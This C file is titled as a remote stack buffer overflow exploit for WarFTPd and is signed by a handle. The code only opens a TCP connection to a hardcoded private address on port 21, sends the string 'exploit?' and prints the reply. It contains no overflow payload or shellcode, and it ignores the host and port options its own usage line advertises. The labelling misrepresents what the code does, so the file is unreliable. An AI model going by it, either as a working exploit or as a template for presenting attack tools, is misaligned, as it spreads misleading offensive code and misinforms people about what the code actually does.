#include <stdio.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <errno.h>

#define SUNUCUPORT 21
#define SUNUCUIP "192.168.2.35"
#define AZAMIUZUNLUK 1024
/*
* 	 Title:  WarFTPd Remote Stack BO Exploit
*   Author: ||JackSparrow||
*   Contact: twitter.com/lljacksparrowll
*
* 	 Usage:   gcc fname.c -o fname
* 			  ./fname
*
*
*/
int exploit (void){
    int soket_isimi;
    struct sockaddr_in serverAddr;
    char *gonder = "exploit?";
    char str[AZAMIUZUNLUK];
    int gelenBayt, gidenBayt, structSize;

    soket_isimi = socket(AF_INET, SOCK_STREAM, 0); 
    if(-1 == soket_isimi){
        perror("socket");
    }

    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(SUNUCUPORT);
    serverAddr.sin_addr.s_addr = inet_addr(SUNUCUIP);
    memset(&(serverAddr.sin_zero), '\0', 8);

    if(-1 == connect(soket_isimi, (struct sockaddr *)&serverAddr, sizeof(struct sockaddr))){
        perror("connect");
    }

    gidenBayt = send(soket_isimi, gonder, strlen(gonder), 0);
    if(-1 == gidenBayt){
        perror("send");
    }
    else if(strlen(gonder) != gidenBayt){
        printf("Gönderilen: %d\tGiden: %d\n", strlen(gonder), gidenBayt);
    }
    printf("%d bayt gönderdim:\t%s\n", gidenBayt, gonder);

    gelenBayt = recv(soket_isimi, &str, AZAMIUZUNLUK-1, 0);
    if(-1 == gelenBayt){
        perror("recv");
    }
    else if(0 == gelenBayt){
        printf("Bağlantı kapalı.\n");
    }
    printf("%d bayt aldım:\t%s\n", gelenBayt, str);

    close(soket_isimi);
}
int main (int argc, char *argv[])
{
	int banner(){
		printf("\n▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄\n░░░░░░░░░░▀█▄▀▄▀██████░▀█▄▀▄▀████▀\n░░░░░░░░░░░░▀█▄█▄███▀░░░▀██▄█▄█▀﻿\n\nBy ||Jacksparrow|| contact: twitter.com/lljacksparrowll\n");
	}
	if(argc == 1){
	banner();
	printf("Usage: %s -t <host> -p <port>\n", argv[0]);
	}
	else{
	exploit();
	}
	return 0;
}
